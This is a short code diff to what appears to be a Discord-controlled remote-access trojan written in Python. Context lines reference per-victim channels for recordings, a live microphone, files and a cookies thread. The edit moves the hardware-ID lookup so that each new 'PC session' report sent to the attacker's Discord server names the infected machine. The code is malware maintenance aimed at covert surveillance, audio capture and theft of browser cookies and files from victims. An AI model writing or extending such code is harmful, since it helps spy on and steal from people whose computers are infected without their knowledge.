@@ -89,8 +89,8 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 @client.event
 async def on_ready():
     global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread
+    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
     if [channel_ids['info'], channel_ids['main'], channel_ids['spam'], channel_ids['file'], channel_ids['recordings'], channel_ids['voice']] == [None, None, None, None, None, None]:
-        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
         first_run = True
         for category_name in client.get_guild(guild_id).categories:
             if hwid in str(category_name):
@@ -126,13 +126,8 @@ async def on_ready():
                     case 'file': channel_ids['file'] = channel.id
                     case 'recordings': channel_ids['recordings'] = channel.id
                     case 'Live microphone': channel_ids['voice'] = channel.id
-            await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```')
 
-
-
-
-
-    await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```Starting new PC session at ' + current_time(True) + '```')
+    await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```')
 
     recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())
 
